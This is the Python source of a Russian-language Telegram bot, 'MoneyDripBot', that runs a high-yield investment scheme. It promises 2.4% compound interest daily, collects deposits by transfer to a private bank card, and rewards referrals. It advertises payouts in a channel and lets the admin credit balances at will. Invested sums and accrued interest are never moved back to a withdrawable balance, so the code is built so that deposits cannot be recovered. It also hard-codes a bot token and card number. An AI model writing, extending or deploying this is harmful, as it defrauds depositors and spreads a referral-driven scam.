import asyncio
import logging
import os
from datetime import datetime
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.webhook.aiohttp_server import SimpleRequestHandler, setup_application
from aiohttp import web
import aiosqlite
import re

# ========== НАСТРОЙКИ ==========
TOKEN = "8587086312:AAE9jbbaPZBzU-niDmOK7uhHhpCYSvf_BoU"
ADMIN_ID = 7603296347
SUPPORT_USERNAME = "CryptoDripClubaD"  # ✅ ИЗМЕНЕНО
CARD_NUMBER = "2200 7012 3329 6489"
CARD_HOLDER = "Леонид К."

# Проценты и лимиты
INTEREST_RATE = 0.024
INTERVAL_HOURS = 24
MIN_DEPOSIT = 100
MIN_WITHDRAW = 500
MIN_INVEST = 100

# Бонусы
WELCOME_BONUS = 15
REFERRAL_REG_BONUS = 15
REFERRAL_DEPOSIT_BONUS = 0.05

# Канал выплат (вставь свой ID)
PAYOUT_CHANNEL_ID = None
PAYOUT_CHANNEL_USERNAME = "@moneydrip_payouts"
SHOW_WITHDRAW_IN_CHANNEL = True

# ========== НАСТРОЙКИ RENDER ==========
RENDER_EXTERNAL_URL = os.environ.get('RENDER_EXTERNAL_URL')
PORT = int(os.environ.get('PORT', 10000))
WEBHOOK_PATH = f'/webhook/{TOKEN}'
if RENDER_EXTERNAL_URL:
    WEBHOOK_URL = f'{RENDER_EXTERNAL_URL}{WEBHOOK_PATH}'
else:
    WEBHOOK_URL = None
# ========================================

bot = Bot(token=TOKEN)
dp = Dispatcher()

# === ЕДИНОЕ ПОДКЛЮЧЕНИЕ К БД ===
db_pool = None

async def get_db():
    global db_pool
    if db_pool is None:
        db_pool = await aiosqlite.connect("users.db", timeout=30)
    return db_pool

async def close_db():
    global db_pool
    if db_pool:
        await db_pool.close()
        db_pool = None

# === ПАРСИНГ ЧИСЕЛ ===
def parse_amount(text: str) -> float:
    text = text.lower().replace(" ", "").replace(",", ".")
    if "k" in text:
        return float(text.replace("k", "")) * 1000
    elif "m" in text:
        return float(text.replace("m", "")) * 1000000
    else:
        return float(text)

# === РАСЧЁТ ДОХОДА ===
def calculate_profit(amount: float, days: int) -> float:
    return amount * ((1 + INTEREST_RATE) ** days - 1)

# === ОТПРАВКА В КАНАЛ ВЫПЛАТ ===
async def send_to_payout_channel(user_id: int, amount: float, card_last: str = ""):
    if not PAYOUT_CHANNEL_ID or not SHOW_WITHDRAW_IN_CHANNEL:
        return
    
    user_hash = str(user_id)[:4] + "•••" + str(user_id)[-2:]
    
    text = (
        f"💸 *ВЫПЛАТА ПОДТВЕРЖДЕНА*\n\n"
        f"👤 Пользователь: `{user_hash}`\n"
        f"💰 Сумма: `{amount:,.0f}₽`\n"
        f"💳 Карта: `{card_last}`\n"
        f"✅ Статус: Выполнено\n"
        f"📅 {datetime.now().strftime('%d.%m.%Y %H:%M')}\n\n"
        f"#{user_hash} #{amount:,.0f}руб"
    )
    
    try:
        await bot.send_message(chat_id=PAYOUT_CHANNEL_ID, text=text, parse_mode="Markdown")
    except:
        pass

# === БАЗА ДАННЫХ ===
async def init_db():
    db = await get_db()
    await db.execute("""
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            balance REAL DEFAULT 0,
            invest_sum REAL DEFAULT 0,
            last_interest TEXT,
            deposit_request REAL DEFAULT 0,
            withdraw_request REAL DEFAULT 0,
            card_number TEXT DEFAULT '',
            referrer_id INTEGER DEFAULT 0,
            referral_earnings REAL DEFAULT 0,
            welcome_bonus_claimed INTEGER DEFAULT 0,
            created_at TEXT DEFAULT CURRENT_TIMESTAMP
        )
    """)
    await db.execute("""
        CREATE TABLE IF NOT EXISTS history (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            type TEXT,
            amount REAL,
            status TEXT,
            details TEXT,
            created_at TEXT DEFAULT CURRENT_TIMESTAMP
        )
    """)
    await db.commit()

async def add_history(user_id: int, type: str, amount: float, status: str = "completed", details: str = ""):
    db = await get_db()
    await db.execute(
        "INSERT INTO history (user_id, type, amount, status, details) VALUES (?, ?, ?, ?, ?)",
        (user_id, type, amount, status, details)
    )
    await db.commit()

# === СТАРТ ===
@dp.message(Command("start"))
async def cmd_start(message: Message):
    user_id = message.from_user.id
    args = message.text.split()
    
    db = await get_db()
    cursor = await db.execute("SELECT user_id, welcome_bonus_claimed FROM users WHERE user_id = ?", (user_id,))
    user = await cursor.fetchone()
    is_new = user is None
    
    if is_new:
        await db.execute(
            "INSERT INTO users (user_id, balance, welcome_bonus_claimed) VALUES (?, ?, 1)",
            (user_id, WELCOME_BONUS)
        )
        await db.commit()
        await add_history(user_id, "welcome_bonus", WELCOME_BONUS, "completed", "Приветственный бонус")
        
        await message.answer(
            f"🎁 *Вам начислен приветственный бонус!*\n"
            f"💰 +{WELCOME_BONUS}₽ на баланс",
            parse_mode="Markdown"
        )
    
    if len(args) > 1 and args[1].startswith("ref") and is_new:
        referrer_id = int(args[1].replace("ref", ""))
        if referrer_id != user_id:
            await db.execute("UPDATE users SET referrer_id = ? WHERE user_id = ?", (referrer_id, user_id))
            await db.commit()
            
            await db.execute(
                "UPDATE users SET balance = balance + ?, referral_earnings = referral_earnings + ? WHERE user_id = ?",
                (REFERRAL_REG_BONUS, REFERRAL_REG_BONUS, referrer_id)
            )
            await db.commit()
            await add_history(referrer_id, "referral_bonus", REFERRAL_REG_BONUS, "completed", 
                            f"Бонус за реферала {user_id}")
            
            try:
                await bot.send_message(
                    referrer_id,
                    f"🎁 *Новый реферал!*\n\n+{REFERRAL_REG_BONUS}₽ на баланс",
                    parse_mode="Markdown"
                )
            except:
                pass
    
    ref_link = f"https://t.me/{(await bot.get_me()).username}?start=ref{user_id}"
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💰 Запустить в работу", callback_data="multiply")],
        [InlineKeyboardButton(text="💳 Баланс", callback_data="balance"),
         InlineKeyboardButton(text="📥 Пополнить", callback_data="deposit")],
        [InlineKeyboardButton(text="📤 Вывести", callback_data="withdraw"),
         InlineKeyboardButton(text="📈 Проценты", callback_data="interest_info")],
        [InlineKeyboardButton(text="👥 Рефералы", callback_data="referrals"),
         InlineKeyboardButton(text="📊 История", callback_data="history")],
        [InlineKeyboardButton(text="🛡 Поддержка", callback_data="support"),
         InlineKeyboardButton(text="ℹ️ Инфо", callback_data="info")]
    ])
    
    await message.answer(
        f"🚀 *Добро пожаловать в MoneyDripBot!*\n\n"
        f"📈 Каждые 24 часа +2,4% к сумме в работе\n"
        f"💳 Пополнение от {MIN_DEPOSIT}₽, вывод от {MIN_WITHDRAW}₽\n\n"
        f"🎁 *Твоя реферальная ссылка:*\n`{ref_link}`\n\n"
        f"🔥 Бонусы: +15₽ за друга, +5% с его пополнений\n\n"
        f"👇 Выбери действие:",
        parse_mode="Markdown",
        reply_markup=keyboard
    )

# === БАЛАНС ===
@dp.callback_query(lambda c: c.data == "balance")
async def show_balance(call: CallbackQuery):
    user_id = call.from_user.id
    db = await get_db()
    cursor = await db.execute(
        "SELECT balance, invest_sum, referral_earnings FROM users WHERE user_id = ?",
        (user_id,)
    )
    row = await cursor.fetchone()
    balance = row[0] if row else 0
    invest = row[1] if row else 0
    ref_earnings = row[2] if row else 0
    
    profit_week = calculate_profit(invest, 7)
    profit_month = calculate_profit(invest, 30)
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_menu")]
    ])
    
    await call.message.edit_text(
        f"💳 *ТВОЙ БАЛАНС*\n\n"
        f"💰 Доступно: `{balance:,.0f}₽`\n"
        f"📈 В работе: `{invest:,.0f}₽`\n"
        f"🎁 Реферальные: `{ref_earnings:,.0f}₽`\n\n"
        f"📅 *Прогноз дохода:*\n"
        f"• Через неделю: `+{profit_week:,.0f}₽`\n"
        f"• Через месяц: `+{profit_month:,.0f}₽`\n\n"
        f"⏳ Каждые 24 часа +2,4% 🔥",
        parse_mode="Markdown",
        reply_markup=keyboard
    )

# === РЕФЕРАЛЫ ===
@dp.callback_query(lambda c: c.data == "referrals")
async def show_referrals(call: CallbackQuery):
    user_id = call.from_user.id
    
    db = await get_db()
    cursor = await db.execute("SELECT COUNT(*) FROM users WHERE referrer_id = ?", (user_id,))
    ref_count_row = await cursor.fetchone()
    ref_count = ref_count_row[0] if ref_count_row else 0
    
    cursor = await db.execute("SELECT referral_earnings FROM users WHERE user_id = ?", (user_id,))
    earnings_row = await cursor.fetchone()
    ref_earnings = earnings_row[0] if earnings_row else 0
    
    ref_link = f"https://t.me/{(await bot.get_me()).username}?start=ref{user_id}"
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📋 Копировать ссылку", callback_data="copy_ref")],
        [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_menu")]
    ])
    
    await call.message.edit_text(
        f"👥 *РЕФЕРАЛЬНАЯ СИСТЕМА*\n\n"
        f"🎁 *Твоя ссылка:*\n`{ref_link}`\n\n"
        f"📊 *Статистика:*\n"
        f"• Приглашено: `{ref_count}` чел.\n"
        f"• Заработано: `{ref_earnings:,.0f}₽`\n\n"
        f"💰 *Бонусы:*\n"
        f"• {REFERRAL_REG_BONUS}₽ — за регистрацию друга\n"
        f"• 5% — с каждого пополнения реферала\n\n"
        f"👉 Отправь ссылку друзьям и зарабатывай!",
        parse_mode="Markdown",
        reply_markup=keyboard
    )

# === ИСТОРИЯ ===
@dp.callback_query(lambda c: c.data == "history")
async def show_history(call: CallbackQuery):
    user_id = call.from_user.id
    
    db = await get_db()
    cursor = await db.execute(
        "SELECT type, amount, status, created_at FROM history WHERE user_id = ? ORDER BY created_at DESC LIMIT 10",
        (user_id,)
    )
    history_rows = await cursor.fetchall()
    
    if not history_rows:
        text = "📊 *ИСТОРИЯ ОПЕРАЦИЙ*\n\nУ тебя пока нет операций."
    else:
        text = "📊 *ИСТОРИЯ (последние 10)*\n\n"
        for op in history_rows:
            type_map = {
                "deposit": "📥 Пополнение",
                "withdraw": "📤 Вывод",
                "invest": "💰 Запуск",
                "interest": "📈 Проценты",
                "referral": "🎁 5%",
                "referral_bonus": "👥 Бонус",
                "welcome_bonus": "🎁 Приветственный",
                "admin": "⚡ Админ"
            }
            op_type = type_map.get(op[0], op[0])
            amount = f"{op[1]:,.0f}₽"
            date = datetime.fromisoformat(op[3]).strftime("%d.%m.%Y")
            text += f"{op_type}: `{amount}`\n📅 {date}\n\n"
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_menu")]
    ])
    
    await call.message.edit_text(text, parse_mode="Markdown", reply_markup=keyboard)

# === ПОПОЛНЕНИЕ ===
@dp.callback_query(lambda c: c.data == "deposit")
async def deposit_start(call: CallbackQuery):
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ Я оплатил", callback_data="i_paid")],
        [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_menu")]
    ])
    
    await call.message.edit_text(
        f"📥 *ПОПОЛНЕНИЕ БАЛАНСА*\n\n"
        f"💳 *Карта Т‑Банк:*\n`{CARD_NUMBER}`\n"
        f"👤 *Получатель:* {CARD_HOLDER}\n\n"
        f"💰 Мин. сумма: {MIN_DEPOSIT}₽\n"
        f"🚀 Максимум: безлимит\n\n"
        f"1️⃣ Переведи сумму на карту\n"
        f"2️⃣ Нажми «✅ Я оплатил»\n"
        f"3️⃣ Введи сумму перевода\n\n"
        f"✅ Примеры: `500`, `1.5k`, `2K`",
        parse_mode="Markdown",
        reply_markup=keyboard
    )

@dp.callback_query(lambda c: c.data == "i_paid")
async def i_paid(call: CallbackQuery):
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="◀️ Отмена", callback_data="back_to_menu")]
    ])
    
    await call.message.edit_text(
        "📝 *Введите сумму перевода:*\n\n"
        f"➡️ Например: `500`, `1.5k`, `2K`",
        parse_mode="Markdown",
        reply_markup=keyboard
    )

@dp.message(lambda m: m.text and re.match(r'^[\d\.]+[km]?$', m.text.lower().replace(" ", "")))
async def process_deposit(message: Message):
    user_id = message.from_user.id
    
    try:
        amount = parse_amount(message.text)
    except:
        await message.answer("❌ Неверный формат. Примеры: 500, 1.5k, 2K")
        return
    
    if amount < MIN_DEPOSIT:
        await message.answer(f"❌ Минимальная сумма — {MIN_DEPOSIT} ₽")
        return
    
    db = await get_db()
    await db.execute("UPDATE users SET deposit_request = ? WHERE user_id = ?", (amount, user_id))
    await db.commit()
    await add_history(user_id, "deposit", amount, "pending", "Заявка на пополнение")
    
    cursor = await db.execute("SELECT referrer_id FROM users WHERE user_id = ?", (user_id,))
    row = await cursor.fetchone()
    referrer_id = row[0] if row else 0
    
    await bot.send_message(
        ADMIN_ID,
        f"🔔 *ЗАЯВКА НА ПОПОЛНЕНИЕ*\n"
        f"🆔 ID: `{user_id}`\n"
        f"💰 Сумма: `{amount:,.0f}₽`\n"
        f"👥 Реферер: `{referrer_id if referrer_id else 'нет'}`\n"
        f"✅ /confirm {user_id}",
        parse_mode="Markdown"
    )
    
    await message.answer(
        f"✅ *Заявка отправлена!*\n"
        f"💰 {amount:,.0f}₽\n"
        f"⏳ 1-3 минуты\n\n"
        f"❓ @{SUPPORT_USERNAME}",
        parse_mode="Markdown"
    )

# === ПОДТВЕРЖДЕНИЕ ПОПОЛНЕНИЯ ===
@dp.message(Command("confirm"))
async def confirm_deposit(message: Message):
    if message.from_user.id != ADMIN_ID:
        return
    
    try:
        user_id = int(message.text.split()[1])
    except:
        await message.answer("Используй: /confirm 123456789")
        return
    
    db = await get_db()
    cursor = await db.execute(
        "SELECT deposit_request, referrer_id FROM users WHERE user_id = ?",
        (user_id,)
    )
    row = await cursor.fetchone()
    if not row or row[0] == 0:
        await message.answer("❌ Нет активных заявок")
        return
    
    amount = row[0]
    referrer_id = row[1]
    
    await db.execute(
        "UPDATE users SET balance = balance + ?, deposit_request = 0 WHERE user_id = ?",
        (amount, user_id)
    )
    await db.commit()
    
    if referrer_id and referrer_id != 0:
        bonus = amount * REFERRAL_DEPOSIT_BONUS
        await db.execute(
            "UPDATE users SET balance = balance + ?, referral_earnings = referral_earnings + ? WHERE user_id = ?",
            (bonus, bonus, referrer_id)
        )
        await db.commit()
        await add_history(referrer_id, "referral", bonus, "completed", f"Бонус за реферала {user_id}")
        
        try:
            await bot.send_message(
                referrer_id,
                f"🎁 *Реферальный бонус!*\n+{bonus:,.0f}₽ (5%)",
                parse_mode="Markdown"
            )
        except:
            pass
    
    await add_history(user_id, "deposit", amount, "completed", "Пополнение подтверждено")
    
    await message.answer(f"✅ Баланс {user_id} пополнен на {amount:,.0f}₽")
    await bot.send_message(
        user_id,
        f"✅ *Баланс пополнен!*\n💰 {amount:,.0f}₽\n🚀 Запускай в работу!",
        parse_mode="Markdown"
    )

# === УМНОЖИТЬ ДЕНЬГИ ===
@dp.callback_query(lambda c: c.data == "multiply")
async def multiply_start(call: CallbackQuery):
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_menu")]
    ])
    
    await call.message.edit_text(
        "💰 *ЗАПУСК В РАБОТУ*\n\n"
        f"💸 Введи *сумма — например: *500, *1.5k\n"
        f"• Мин. сумма: {MIN_INVEST}₽\n"
        f"• Доход: 2,4% каждые 24 часа\n\n"
        f"📅 *Прогноз:*\n"
        f"500₽ → +84₽ за месяц\n"
        f"1000₽ → +168₽ за месяц",
        parse_mode="Markdown",
        reply_markup=keyboard
    )

@dp.message(lambda m: m.text and m.text.lower().startswith('*'))
async def process_multiply(message: Message):
    user_id = message.from_user.id
    text = message.text.replace('*', '').strip()
    
    try:
        amount = parse_amount(text)
    except:
        await message.answer("❌ Используй: *500, *1.5k, *2K")
        return
    
    db = await get_db()
    cursor = await db.execute("SELECT balance FROM users WHERE user_id = ?", (user_id,))
    row = await cursor.fetchone()
    balance = row[0] if row else 0
    
    if amount > balance:
        await message.answer(f"❌ Недостаточно. Баланс: {balance:,.0f}₽")
        return
    
    if amount < MIN_INVEST:
        await message.answer(f"❌ Минимум {MIN_INVEST}₽")
        return
    
    await db.execute(
        "UPDATE users SET balance = balance - ?, invest_sum = invest_sum + ?, last_interest = ? WHERE user_id = ?",
        (amount, amount, datetime.now().isoformat(), user_id)
    )
    await db.commit()
    await add_history(user_id, "invest", amount, "completed", "Запуск в работу")
    
    profit_week = calculate_profit(amount, 7)
    profit_month = calculate_profit(amount, 30)
    
    await message.answer(
        f"✅ *ГОТОВО!*\n\n"
        f"💸 {amount:,.0f}₽ в работе\n"
        f"📈 Каждые 24 часа +2,4%\n\n"
        f"📅 *Прогноз:*\n"
        f"• Неделя: +{profit_week:,.0f}₽\n"
        f"• Месяц: +{profit_month:,.0f}₽",
        parse_mode="Markdown"
    )

# === ПРОЦЕНТЫ (КАЖДЫЕ 24 ЧАСА) ===
async def interest_worker():
    while True:
        await asyncio.sleep(INTERVAL_HOURS * 3600)
        db = await get_db()
        cursor = await db.execute("SELECT user_id, invest_sum FROM users WHERE invest_sum > 0")
        users = await cursor.fetchall()
        for user_id, invest in users:
            profit = invest * INTEREST_RATE
            await db.execute(
                "UPDATE users SET invest_sum = invest_sum + ? WHERE user_id = ?",
                (profit, user_id)
            )
            await add_history(user_id, "interest", profit, "completed", "Начисление 2,4%")
            try:
                await bot.send_message(
                    user_id,
                    f"📈 *НАЧИСЛЕНИЕ ПРОЦЕНТОВ*\n\n"
                    f"➕ +{profit:,.2f}₽\n"
                    f"💰 В работе: {invest + profit:,.2f}₽\n\n"
                    f"⏳ Следующее через 24ч",
                    parse_mode="Markdown"
                )
            except:
                pass
        await db.commit()

# === ВЫВОД СРЕДСТВ ===
@dp.callback_query(lambda c: c.data == "withdraw")
async def withdraw_start(call: CallbackQuery):
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_menu")]
    ])
    
    await call.message.edit_text(
        "📤 *ВЫВОД СРЕДСТВ*\n\n"
        f"💰 Мин. сумма: {MIN_WITHDRAW}₽\n"
        f"💳 Карта Т‑Банк\n\n"
        f"➡️ *Введи сумму и номер карты:*\n"
        f"Формат: `СУММА НОМЕР`\n"
        f"✅ Пример: `1000 2200123456789012`",
        parse_mode="Markdown",
        reply_markup=keyboard
    )

@dp.message(lambda m: len(m.text.split()) == 2 and m.text.split()[0].replace('.', '').isdigit())
async def process_withdraw(message: Message):
    user_id = message.from_user.id
    parts = message.text.split()
    
    try:
        amount = float(parts[0])
        card_number = parts[1]
    except:
        await message.answer("❌ Формат: `1000 2200123456789012`")
        return
    
    if amount < MIN_WITHDRAW:
        await message.answer(f"❌ Минимум {MIN_WITHDRAW}₽")
        return
    
    db = await get_db()
    cursor = await db.execute("SELECT balance FROM users WHERE user_id = ?", (user_id,))
    row = await cursor.fetchone()
    balance = row[0] if row else 0
    
    if amount > balance:
        await message.answer(f"❌ Недостаточно. Баланс: {balance:,.0f}₽")
        return
    
    await db.execute(
        "UPDATE users SET withdraw_request = ?, card_number = ? WHERE user_id = ?",
        (amount, card_number, user_id)
    )
    await db.commit()
    await add_history(user_id, "withdraw", amount, "pending", f"Заявка, карта: {card_number[-4:]}")
    
    await bot.send_message(
        ADMIN_ID,
        f"🔔 *ЗАЯВКА НА ВЫВОД*\n"
        f"🆔 ID: `{user_id}`\n"
        f"💰 {amount:,.0f}₽\n"
        f"💳 {card_number}\n"
        f"✅ /withdraw {user_id}",
        parse_mode="Markdown"
    )
    
    await message.answer(
        f"✅ *Заявка отправлена!*\n"
        f"💰 {amount:,.0f}₽\n"
        f"💳 {card_number[-4:]}\n"
        f"⏳ 1-3 минуты",
        parse_mode="Markdown"
    )

@dp.message(Command("withdraw"))
async def confirm_withdraw(message: Message):
    if message.from_user.id != ADMIN_ID:
        return
    
    try:
        user_id = int(message.text.split()[1])
    except:
        await message.answer("Используй: /withdraw 123456789")
        return
    
    db = await get_db()
    cursor = await db.execute(
        "SELECT withdraw_request, card_number FROM users WHERE user_id = ?",
        (user_id,)
    )
    row = await cursor.fetchone()
    if not row or row[0] == 0:
        await message.answer("❌ Нет заявок")
        return
    
    amount = row[0]
    card = row[1]
    
    await db.execute(
        "UPDATE users SET balance = balance - ?, withdraw_request = 0 WHERE user_id = ?",
        (amount, user_id)
    )
    await db.commit()
    await add_history(user_id, "withdraw", amount, "completed", f"Вывод, карта: {card[-4:]}")
    
    await send_to_payout_channel(user_id, amount, card[-4:])
    
    await message.answer(f"✅ Вывод {amount:,.0f}₽ подтверждён")
    await bot.send_message(
        user_id,
        f"✅ *Вывод подтверждён!*\n"
        f"💰 {amount:,.0f}₽\n"
        f"⏳ 1-3 минуты",
        parse_mode="Markdown"
    )

# === ПРОЦЕНТЫ ИНФО ===
@dp.callback_query(lambda c: c.data == "interest_info")
async def interest_info(call: CallbackQuery):
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_menu")]
    ])
    
    await call.message.edit_text(
        f"📈 *2,4% КАЖДЫЕ 24 ЧАСА*\n\n"
        f"1️⃣ Пополни от {MIN_DEPOSIT}₽\n"
        f"2️⃣ Запусти *1000 в работу\n"
        f"3️⃣ Получай проценты каждый день\n\n"
        f"✨ *Пример:*\n"
        f"1000₽ → 1024₽ (день)\n"
        f"→ 1181₽ (неделя)\n"
        f"→ 2050₽ (месяц)\n\n"
        f"💰 Вывод от {MIN_WITHDRAW}₽",
        parse_mode="Markdown",
        reply_markup=keyboard
    )

# === ПОДДЕРЖКА ===
@dp.callback_query(lambda c: c.data == "support")
async def support(call: CallbackQuery):
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="👤 Написать", url=f"https://t.me/{SUPPORT_USERNAME}")],
        [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_menu")]
    ])
    
    await call.message.edit_text(
        f"🛡 *ПОДДЕРЖКА*\n\n@{SUPPORT_USERNAME}\n⏱ 5-15 минут",
        parse_mode="Markdown",
        reply_markup=keyboard
    )

# === ИНФО ===
@dp.callback_query(lambda c: c.data == "info")
async def info(call: CallbackQuery):
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_menu")]
    ])
    
    await call.message.edit_text(
        f"ℹ️ *О ПРОЕКТЕ*\n\n"
        f"📈 Доход: 2,4% / 24ч\n"
        f"📉 Старт: от {MIN_DEPOSIT}₽\n"
        f"📤 Вывод: от {MIN_WITHDRAW}₽\n\n"
        f"🎁 *Бонусы:*\n"
        f"• +15₽ за регистрацию\n"
        f"• +15₽ за реферала\n"
        f"• +5% с пополнений друзей\n\n"
        f"💳 Карта: Т‑Банк\n"
        f"👤 Получатель: {CARD_HOLDER}\n"
        f"✅ Работаем с 2024",
        parse_mode="Markdown",
        reply_markup=keyboard
    )

# === КОПИРОВАТЬ ССЫЛКУ ===
@dp.callback_query(lambda c: c.data == "copy_ref")
async def copy_ref(call: CallbackQuery):
    await call.answer("Ссылка скопирована! 📋", show_alert=False)

# === ДОБАВИТЬ БАЛАНС (АДМИН) ===
@dp.message(Command("add"))
async def add_balance(message: Message):
    if message.from_user.id != ADMIN_ID:
        return
    
    try:
        parts = message.text.split()
        user_id = int(parts[1])
        amount = float(parts[2])
    except:
        await message.answer("Используй: /add 123456789 1000")
        return
    
    db = await get_db()
    await db.execute("UPDATE users SET balance = balance + ? WHERE user_id = ?", (amount, user_id))
    await db.commit()
    await add_history(user_id, "admin", amount, "completed", "Начислено админом")
    
    await message.answer(f"✅ Баланс {user_id} +{amount:,.0f}₽")
    await bot.send_message(user_id, f"💰 Вам начислено {amount:,.0f}₽!")

# === СТАТИСТИКА (АДМИН) ===
@dp.message(Command("stats"))
async def stats(message: Message):
    if message.from_user.id != ADMIN_ID:
        return
    
    db = await get_db()
    cursor = await db.execute("SELECT COUNT(*) FROM users")
    total_users = (await cursor.fetchone())[0]
    
    cursor = await db.execute("SELECT SUM(balance) FROM users")
    total_balance = (await cursor.fetchone())[0] or 0
    
    cursor = await db.execute("SELECT SUM(invest_sum) FROM users")
    total_invest = (await cursor.fetchone())[0] or 0
    
    cursor = await db.execute("SELECT COUNT(*) FROM history WHERE status = 'pending'")
    pending = (await cursor.fetchone())[0] or 0
    
    await message.answer(
        f"📊 *СТАТИСТИКА*\n\n"
        f"👥 Пользователей: {total_users}\n"
        f"💰 Балансов: {total_balance:,.0f}₽\n"
        f"📈 В работе: {total_invest:,.0f}₽\n"
        f"⏳ Заявок: {pending}\n\n"
        f"📊 2,4% / 24ч | Вывод от {MIN_WITHDRAW}₽",
        parse_mode="Markdown"
    )

# === ID ===
@dp.message(Command("id"))
async def get_id(message: Message):
    await message.answer(f"🆔 *Твой ID:* `{message.from_user.id}`", parse_mode="Markdown")

# === НАЗАД В МЕНЮ ===
@dp.callback_query(lambda c: c.data == "back_to_menu")
async def back_to_menu(call: CallbackQuery):
    user_id = call.from_user.id
    ref_link = f"https://t.me/{(await bot.get_me()).username}?start=ref{user_id}"
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💰 Запустить в работу", callback_data="multiply")],
        [InlineKeyboardButton(text="💳 Баланс", callback_data="balance"),
         InlineKeyboardButton(text="📥 Пополнить", callback_data="deposit")],
        [InlineKeyboardButton(text="📤 Вывести", callback_data="withdraw"),
         InlineKeyboardButton(text="📈 2,4%", callback_data="interest_info")],
        [InlineKeyboardButton(text="👥 Рефералы", callback_data="referrals"),
         InlineKeyboardButton(text="📊 История", callback_data="history")],
        [InlineKeyboardButton(text="🛡 Поддержка", callback_data="support"),
         InlineKeyboardButton(text="ℹ️ Инфо", callback_data="info")]
    ])
    
    await call.message.edit_text(
        f"🚀 *Главное меню*\n\n"
        f"🎁 Твоя ссылка:\n`{ref_link}`\n\n"
        f"🔥 2,4% каждые 24 часа | Вывод от {MIN_WITHDRAW}₽\n\n"
        f"👇 Выбери действие:",
        parse_mode="Markdown",
        reply_markup=keyboard
    )

# === ЗАПУСК ЧЕРЕЗ ВЕБХУКИ ===
async def on_startup():
    """Действия при старте"""
    if WEBHOOK_URL:
        await bot.set_webhook(WEBHOOK_URL, allowed_updates=dp.resolve_used_update_types())
    await init_db()
    asyncio.create_task(interest_worker())

async def on_shutdown():
    """Действия при остановке"""
    await bot.delete_webhook()
    await close_db()

def main():
    """Запуск через aiohttp"""
    app = web.Application()
    
    dp.startup.register(on_startup)
    dp.shutdown.register(on_shutdown)
    
    if WEBHOOK_URL:
        webhook_handler = SimpleRequestHandler(
            dispatcher=dp,
            bot=bot,
        )
        webhook_handler.register(app, path=WEBHOOK_PATH)
        setup_application(app, dp, bot=bot)
    
    web.run_app(app, host='0.0.0.0', port=PORT)

if __name__ == '__main__':
    logging.basicConfig(level=logging.INFO)
    main()